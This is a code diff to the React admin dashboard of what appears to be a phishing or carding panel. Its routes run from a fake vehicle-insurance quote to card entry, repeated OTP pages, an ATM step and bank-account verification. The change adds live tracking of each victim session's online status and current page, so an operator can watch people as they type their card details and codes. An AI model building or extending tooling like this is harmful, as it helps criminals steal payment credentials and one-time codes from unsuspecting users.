@@ -1,7 +1,7 @@
 ﻿import { useEffect, useMemo, useState, useCallback, useRef, type ReactNode } from "react";
 import { useLocation } from "wouter";
 import { getToken, logoutAdmin } from "@/lib/auth";
-import { getAdminStats, listAdminSubmissions, sendAdminControl, adminLogoutAll, adminChangePassword, getAllAdminSubmissions } from "@/lib/api";
+import { getAdminStats, listAdminSubmissions, sendAdminControl, adminLogoutAll, adminChangePassword, getAllAdminSubmissions, getTrackedSessions, type SessionTrackingInfo } from "@/lib/api";
 import { getAdminSettings, saveAdminSettings, getBlockedSessions, blockSession, unblockSession, getTrashItems, moveSubmissionToTrash, restoreTrashItem, deleteTrashItem, clearTrash } from "@/lib/admin-store";
 import { Button } from "@/components/ui/button";
 import { Badge } from "@/components/ui/badge";
@@ -168,6 +168,28 @@ function SessionHistoryDialog({ open, rows, onClose }: { open: boolean; rows: Su
   );
 }
 
+// Page Arabic names mapping
+function getPageArabic(page: string): string {
+  const pageMap: Record<string, string> = {
+    "/": "الصفحة الرئيسية",
+    "/form": "بيانات المركبة",
+    "/select": "اختيار الباقة",
+    "/total": "ملخص التكلفة",
+    "/total2": "تأكيد التكلفة",
+    "/visa": "الدفع بالبطاقة",
+    "/otp": "رمز التحقق",
+    "/otp2": "رمز التحقق (محاولة 2)",
+    "/otp3": "رمز التحقق (محاولة 3)",
+    "/atm": "صراف ATM",
+    "/nomer": "رقم الحساب",
+    "/nomer-wait": "انتظار التحقق",
+    "/nomer-otp": "رمز التحقق للحساب",
+    "/identity-check": "التحقق من الهوية",
+    "/waiting": "قائمة الانتظار",
+  };
+  return pageMap[page] || page || "غير معروف";
+}
+
 function SessionBox({
   sessionId,
   rows,
@@ -179,6 +201,8 @@ function SessionBox({
   onUnblock,
   onDelete,
   onOpenHistory,
+  currentPage,
+  isOnline,
 }: {
   sessionId: string;
   rows: SubmissionRow[];
@@ -190,6 +214,8 @@ function SessionBox({
   onUnblock: () => void;
   onDelete: () => void;
   onOpenHistory: () => void;
+  currentPage?: string;
+  isOnline?: boolean;
 }) {
   const [expanded, setExpanded] = useState(true);
   const [historyExpanded, setHistoryExpanded] = useState(false);
@@ -251,8 +277,16 @@ function SessionBox({
               <button type="button" onClick={() => setExpanded((value) => !value)} className="w-full text-right">
                 <div className="flex items-center justify-between gap-3">
                   <div className="space-y-1">
-                    <p className="text-sm font-semibold text-slate-900 truncate">{name}</p>
+                    <div className="flex items-center gap-2">
+                      {/* Online/Offline Status Indicator */}
+                      <span className={`w-2 h-2 rounded-full ${isOnline ? "bg-green-500 animate-pulse" : "bg-gray-400"}`} />
+                      <p className="text-sm font-semibold text-slate-900 truncate">{name}</p>
+                    </div>
                     <p className="text-xs text-slate-500" dir="ltr">{phone}</p>
+                    {/* Current Page */}
+                    <p className="text-[10px] text-blue-600 font-medium">
+                      📍 {getPageArabic(currentPage || "")}
+                    </p>
                   </div>
                   <div className="flex items-center gap-2 text-xs text-slate-500">
                     <span dir="ltr">{lastActivity ? formatAgo(lastActivity) : "—"}</span>
@@ -625,6 +659,9 @@ export default function AdminDashboard() {
   const [passwordValue, setPasswordValue] = useState("");
   const [passwordStatus, setPasswordStatus] = useState<string | null>(null);
   const intervalRef = useRef<number | null>(null);
+  
+  // Track session online status and current page
+  const [trackingInfo, setTrackingInfo] = useState<Record<string, SessionTrackingInfo>>({});
 
   const sessions = useMemo(() => {
     const trashedIds = new Set(trashItems.map((item) => item.id));
@@ -667,12 +704,20 @@ export default function AdminDashboard() {
     const token = getToken();
     if (!token) return;
     try {
-      const [statsData, submissionsResponse] = await Promise.all([
+      const [statsData, submissionsResponse, trackedSessions] = await Promise.all([
         getAdminStats(token),
         getAllAdminSubmissions(token),
+        getTrackedSessions(),
       ]);
       setStats(statsData);
       setRawRows(submissionsResponse.submissions);
+      
+      // Update tracking info
+      const trackingMap: Record<string, SessionTrackingInfo> = {};
+      trackedSessions.sessions.forEach((session) => {
+        trackingMap[session.sessionId] = session;
+      });
+      setTrackingInfo(trackingMap);
     } catch (error) {
       console.error("Failed to load admin data:", error);
       if (error instanceof Error && (error.message.includes("Unauthorized") || error.message.includes("401"))) {
@@ -948,6 +993,8 @@ export default function AdminDashboard() {
                     onUnblock={() => handleUnblock(sessionId)}
                     onDelete={() => handleDeleteSession(sessionId)}
                     onOpenHistory={() => setHistoryDialog({ sessionId, rows })}
+                    currentPage={trackingInfo[sessionId]?.currentPage}
+                    isOnline={trackingInfo[sessionId]?.isOnline}
                   />
                 ))}
               </div>
